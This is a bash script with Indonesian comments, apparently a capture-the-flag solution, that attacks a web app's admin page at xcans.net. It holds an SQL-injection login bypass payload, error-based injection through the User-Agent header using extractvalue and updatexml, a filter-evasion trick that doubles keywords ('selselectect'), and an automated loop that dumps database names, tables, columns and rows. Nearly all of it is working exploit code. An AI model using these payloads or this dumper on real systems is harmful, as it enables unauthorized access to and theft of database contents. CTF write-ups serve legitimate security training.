#!/usr/bin/env bash
# Simple Dump The Flag challenge xcans.net
# By : Versailles

# Pertama scan aja webapps nya dengan dirsearch / tools file/path scanner pasti ktemu robots.txt *awali reconn mu dengan ini
# Setelah dibaca Disallow: /IMissYou  da dir yg menarik IMissYou
# Saat dikunjungi ternyata Admin Page . coba basic sql injection bypass authentication
# Tapi ada waf yg blocked or true limit . tapi tenang masih ada payload '-0||'
# Setelah berhasil masuk ternyata ga ada apa2 ;v wkwkwk
# Ojo lali selalu ctrl + u / view-source , ditemukan file visitor.php 
# Tapi yg menarik disini adalah system nge record ip + user agent kita (terbersit pasti ada INSERT data ke Database) *Mungin bisa di inject
# Kalau ip ga bisa di manipulasi , tapi user agent bisa .
# Kalau pake burp suite tinggal intercept lalu edit UA beres :v
# tapi disini kita coba pake curl biar kalo bawa hp(termux) doang masih bisa nginjek di bagian yg ga wajar seperti UA ,jd ga ketergantunan tool / device
# Kenapa curl nya 2x / ga bs langsung ? karena harus membawa session login / cookie dulu
# curl -s -c cookie.txt http://xcans.net/IMissYou/ -d "user='-0||'&pass="
# curl -s -b cookie.txt -A "'" http://xcans.net/IMissYou/visitor.php
# Uhh Error SQL , fix sql injection di insert User Agent
# Tapi di insert ya yg jelas harus Error based / double query
# Test cek version
# curl -s -b cookie.txt -A "'and extractvalue(0, concat(0x7e, version())),'" http://xcans.net/IMissYou/visitor.php
# other query dengan updatexml : 'and updatexml(0, concat(0x7e, version()),0),'
# Oiya WAF di script visitor.php ini select dan or , waf nya bersifat nge replace select dan or 
# Bypass e piye ? selselectect . artine ketika waf menghapus / replace select yg tengah , maka select yg terpisah akan menjadi satu . *kapan aku karo de e iso bersatu yo?
# Lebih lanjut pahamono simple shellscript iki


# Untuk melakukan request kita harus dapat session login dulu
login=$(curl -s -c cookie.txt http://xcans.net/IMissYou/ -d "user='-0||'&pass=")

dump(){
	payload="'and extractvalue(0,concat(0x23,$1,0x23)),'"
	# cookie dari login dibawa setiap request
	get=$(curl -s -b cookie.txt -A "$payload" http://xcans.net/IMissYou/visitor.php)
	echo $get | grep -oP "(?<=#).*?(?=#)"
}

table(){
	dump "(selselectect table_name from infoorrmation_schema.tables where table_schema=database() limit $2,1)"
}

column(){
	dump "(selselectect column_name from infoorrmation_schema.columns where table_name='$1' limit $2,1)"
}

data(){
	dump "(selselectect $1 from $2 limit $3,1)"
}

cat <<EOF
+-----------------------------------------------+
|	Target : http://xcans.net		|
|	By : Versailles / https://t.me/viloid	|
|	Sec7or Team ~ Surabaya Hacker Link	|
+-----------------------------------------------+
EOF


db=$(dump "database()");
v=$(dump "version()");
u=$(dump "user()");
echo -e "[!] Database Information :\n\tDBName : $db\n\tVersion : $v\n\tUser : $u\n";

tc=$(dump "(selselectect count(*)from infoorrmation_schema.tables where table_schema=database())");
echo "[!] Found : $tc table_name";
#dump table
for i in `eval echo {0..$tc}`;do
	echo -e "\t`table $db $i`";
done

read -p '[?] Select table_name : ' t
cc=$(dump "(selselectect count(*)from infoorrmation_schema.columns where table_schema=database() and table_name='$t')")

echo "[!] Found : $cc column_name";
#dump column
for i in `eval echo {0..$cc}`;do
	echo -e "\t`column $t $i`";
done

read -p '[?] Select column_name : ' c
dc=$(dump "(selselectect count(*)from $t)")

echo "[!] Found : $dc rows";
#dump rows
for i in `eval echo {0..$dc}`;do
	echo -e "\t`data $c $t $i`";
done
